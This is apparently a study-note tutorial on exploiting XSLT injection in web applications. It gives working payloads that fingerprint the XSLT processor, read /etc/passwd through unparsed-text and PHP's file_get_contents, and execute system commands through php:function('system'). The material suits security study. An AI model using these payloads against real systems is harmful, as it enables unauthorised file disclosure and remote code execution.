# Exploiting XSLT Injection
***

### Identifying XSLT Injection
#### For instance, a web application that displays basic information about some academy modules, and at the bottom of the page we can provide a username that is inserted into the headline at the top list.
#### Suppose the web application stores the module information in an XML document and displays the data using XSLT processing. Consequently, we may be able to execute XSLT injection if there is no sanitization before XSLT processing.
#### In order to test , we can try to insert a broken XML tag (`e.g. <`) to try to provoke an error in the web application.

### Information Disclosure
#### By injecting the following XSLT elements we can try to deduce some information about the XSLT processor:
```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

### Local File Inclusion (LFI)
#### Depending on the XSLT version and configuration of the XSLT library we can use several functions to read a local file.
#### For instance, the following XSLT uses the `unparsed-text` function to read a local file:
```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```
#### The `unparsed-text` function , only works from XSLT version 2.0 . For older versions we can use PHP functions , when the XSLT library is configured to support PHP.
#### Example using the `file_get_contents` function:
```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

### Remote Code Execution (RCE)
#### When an XSLT processor supports PHP functions, we can use a PHP function that executes a local system command to obtain RCE.
```xml
<xsl:value-of select="php:function('system','id')" />
```

